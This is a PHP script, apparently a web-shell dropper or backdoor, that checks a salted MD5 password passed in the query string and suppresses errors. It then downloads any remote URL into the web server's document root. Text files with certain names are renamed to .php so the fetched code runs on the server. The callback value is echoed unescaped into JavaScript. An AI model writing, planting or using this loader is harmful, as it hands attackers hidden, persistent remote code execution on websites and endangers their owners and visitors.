<?php
    //请求示例: http://192.168.0.44:8011/loader.php?laws=abc&ciphertext=900150983cd24fb0d6963f7d28e17f72&mUrl=http://*.*/*.*&callBack=cbName
	error_reporting(0);//E_ALL
	$mUrl=$_GET["mUrl"];
	$callBack=$_GET["callBack"];
	$laws=$_GET["laws"]."f938f2cc18095570b719b7e4588a39bf"; /*明文*/;
	$ciphertext=$_GET["ciphertext"];/*密文*/
	$relativePath="";//$_GET["relativePath"].""; /*相对路径,比如这里的值为 web1\p1 那么下面的代码创建的目录或文件就相对这个路径而创建的*/
	$hash=md5($laws);
	$APPL_PHYSICAL_PATH=$_SERVER['DOCUMENT_ROOT']."";
    //echo $APPL_PHYSICAL_PATH;exit;
	$member=$_GET["member"]."";
	//header("application/x-javascript; charset=utf-8");
    //echo $APPL_PHYSICAL_PATH;exit;
	if($hash==$ciphertext){ /*如果有权限*/
		if(count($mUrl)>0){
			try{
				$resp=downloadFile($mUrl,$relativePath,$APPL_PHYSICAL_PATH,$member);
				if(!$resp){
					$jscript="(function(callBack){callBack('no file...');})(".$callBack.")";
					echo $jscript;
					exit;
				}else{
					$jscript="(function(callBack){callBack(true);})(".$callBack.")";
					echo $jscript;
					exit;
				}
			}catch(Exception $e){
				$tmp=json_encode($e);
				$jscript="(function(callBack){callBack('+tmp+');})(".$callBack.")";
				echo $jscript;
				exit;
			}
		}
	}else{
		echo "You do not have permission to do this...";//您没有权限进行此操作
		exit;
    }


    /*作用:下载文件
     *@url: 文件的绝对url
    */
	function downloadFile($url,$relativePath,$APPL_PHYSICAL_PATH,$member){
		$tmpUrl1=preg_replace("/https?:\/\//","",$url);
		$target_url="http://".preg_replace("/\/.*?\/$member/","",$tmpUrl1);
		$tmpArr=explode("/",$target_url);
		$replacePath=preg_replace("/^\\|^\//","",$relativePath);
		$replacePath=preg_replace("/\\$|\/$/","",$relativePath);
		$tmp1=count(explode("\\",$replacePath))>0 ? explode("\\",$replacePath):explode("/",$replacePath);
		$APPL_PHYSICAL_PATH=$APPL_PHYSICAL_PATH."";/*强行转换字符串*/
		//for($i=0;$i<count($tmp1);$i++){
		//	$tmp2=$tmp1[$i];
		//	/*如果已经存在replacePath则替换为空*/
		//	$APPL_PHYSICAL_PATH=preg_replace("/\\\\/","/",$APPL_PHYSICAL_PATH);
		//	$APPL_PHYSICAL_PATH=preg_replace("/$tmp2/","",$APPL_PHYSICAL_PATH);
		//}
		$APPL_PHYSICAL_PATH=preg_replace("/\\/","",$APPL_PHYSICAL_PATH);
		//$APPL_PHYSICAL_PATH.="/";
		//$forder=$APPL_PHYSICAL_PATH . preg_replace("/\\$|\/$/","",(preg_replace("/^\\|^\//","",$relativePath))) . "/";
		
		$forder=$APPL_PHYSICAL_PATH . "/";
		$forder=preg_replace("/\\\\/","/",$forder);
		//echo $forder;exit;
		//for(var i=3;i<tmpArr.length-1;i++){/*创建目录*/
		for($i=3;$i<count($tmpArr)-1;$i++){/*创建目录*/
			$tmp=$tmpArr[$i];
			$forder.=$tmp;
			if(file_exists($forder)){/*文件夹已存在*/
			
			}else{
				mkdir(".".$forder);
			}
			$forder.="/";
		}
		
		$fileName = $tmpArr[count($tmpArr) - 1];
		if (stripos($fileName,"upload.txt")) $fileName =preg_replace("/\.txt/",".php",$fileName);
		if (stripos($fileName,"viewf938f2cc18095570b719b7e4588a39bf.txt")) $fileName =preg_replace("/\.txt/",".php",$fileName);
		$file = fopen ($url, "rb");         
		if ($file) {         
			$newf = fopen (".".$forder.$fileName, "wb");         
		if ($newf)         
			while(!feof($file)) {         
				fwrite($newf, fread($file, 1024 * 8 ), 1024 * 8 );         
			}         
		}         
		if ($file) {         
			fclose($file);         
		}         
		if ($newf) {
			fclose($newf);  
			return true;	
		}
		return false;
	}
?>